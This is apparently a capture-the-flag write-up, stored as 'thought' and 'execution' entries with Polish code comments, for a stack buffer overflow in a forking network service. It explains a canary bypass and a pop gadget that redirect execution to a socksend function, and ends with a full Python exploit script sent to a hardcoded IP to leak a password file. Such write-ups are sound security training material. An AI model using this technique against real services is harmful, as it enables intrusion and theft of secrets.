[
    {
        "type": "thought",
        "content": "We get the program and analyze it. When run, it reads the contents of the password.txt file into a global variable, and starts listening on port 24242 and forks for each connection.\n\nEach fork reads 256 bytes from the user and calls some function from the global function table:\n\nbytes_read = recv(sockfd, recv_buf, (unsigned int)BUF_SIZE, 0);\nif (bytes_read > 0)\n    func_array[recv_buf[0]](recv_buf, (unsigned int)bytes_read);\nEach function is similar, and looks something like this:\n\nunsigned char func_32(unsigned char *buf, unsigned int count)\n{\n    unsigned int i;\n    unsigned char localbuf[0x84]; // sta\u0142a 0x84 jest r\u00f3\u017cna dla ka\u017cdej funkcji w tablicy\n    unsigned char byte=0x84; // sta\u0142a 0x84 jest r\u00f3\u017cna dla ka\u017cdej funkcji w tablicy\n\n    memset(localbuf, byte, sizeof(localbuf));\n    printf(\"in function func_32, count is %u, bufsize is 0x84\\n\", count);\n\n    if (0 == --count)\n         return 0;\n\n    for (i = 0; i < count; ++i)\n         localbuf[i] ^= buf[i];\n\n    func_array[localbuf[0]](localbuf+1, count);\n    return 0;\n}\nYou can immediately see that it is easy to cause a buffer overflow, but unfortunately - the stack is protected by canaries so it won't be that easy.\n\nThe code also shows an unused socksend function that sends the buffer specified in the argument to the socket specified in the argument.\n\nAfter a moment of thought, we come to the conclusion that we can skip the canary by simply xoring it with zeros. Then all we have to do is overwrite the return address in the appropriate way, so as to call the socksend function with the parameters socksend(fd, password, BUF_SIZE) (this way the program itself will send us the flag).\n\nUnfortunately it's not that simple, there's not enough space on the stack to fit the arguments for the socksend function (after overwriting the 'counter' variable the function execution ends). But if we try, we can jump to the function frame below. We use the following gadget for this:\n\ngadget_pop:\nadd     esp, 0Ch    ; pomini\u0119cie 3 element\u00f3w na stosie\npop     ebx         ; zdj\u0119cie elementu ze stosu (i zapisanie do ebx)\npop     esi         ; zdj\u0119cie elementu ze stosu (i zapisanie do esi)\npop     edi         ; zdj\u0119cie elementu ze stosu (i zapisanie do edi)\npop     ebp         ; zdj\u0119cie elementu ze stosu (i zapisanie do ebp)\nretn                ; zdj\u0119cie elementu ze stosu i skoczenie od niego\nWhich removes 7 items from the stack, and jumps under 8.\n\nSo the final plan is this: we jump to this gadget, it pops the appropriate amount of parameters off the stack, then execution goes to the beginning of our clean, unxored buffer in memory and we can do whatever we want.\nThe script we used :o to generate shellcode and send it to the program:"
    },
    {
        "type": "execution",
        "content": "# -*- coding: utf-8 -*-\nimport struct, socket\n\nHOST = '54.152.37.20'\nPORT = 24242\n\ns = socket.socket()\ns.connect((HOST, PORT))\n\n# oryginalny adres powrotu na stosie\nfirst_return_addr = 0x08056AFA\n# placeholder na zmienne kt\u00f3rych zawarto\u015b\u0107 jest niewa\u017cna\nplaceholder = 'xxxx'\n\ngadget_pop_xor = struct.pack('<I', 0x080578f5 ^ first_return_addr)\npassword_addr = struct.pack('<I', 0x0805F0C0)\nsocksend_addr = struct.pack('<I', 0x0804884B)\nexit_addr = struct.pack('<I', 0x08048670)\n\ndef get_payload(counter):\n    # xorujemy z 1, bo chcemy \u017ceby counter przyj\u0105\u0142 1\n    counter_xor = struct.pack('<I', counter ^ 1)\n    # sk\u0142adamy payload\n    return (\n            # adres funkcji socksend (znany)\n            socksend_addr\n            # adres powrotu z funkcji socksend do exit\n            + exit_addr\n            # deskryptor dla socksend (przewidywana warto\u015b\u0107)\n            + struct.pack('<I', 4)\n            # adres zmiennej globalnej password dla socksend\n            + password_addr\n            # ilo\u015b\u0107 bajt\u00f3w do przeczytania dla socksend\n            + struct.pack('<I', 256)\n            # wolne miejsce na stosie (niezaj\u0119ta cz\u0119\u015b\u0107 bufora)\n            + placeholder * 39\n            # xorowane z kanarkiem\n            + '\\0\\0\\0\\0'\n            # puste miejsce na stosie\n            + placeholder * 3\n            # podmieniamy adres powrotu na gadget_pop\n            + gadget_pop_xor\n            # xorowane z niepotrzebnym ju\u017c argumentem z adresem bufora\n            + placeholder\n            # zerowanie countera\n            + counter_xor\n            )\n\n# zmierzenie d\u0142ugo\u015bci payloadu\npayload_length = len(get_payload(123))\n# i stworzenie ostatecznego payloadu\npayload = get_payload(payload_length - 1)\ns.send(payload)\nprint s.recv(99999)"
    }
]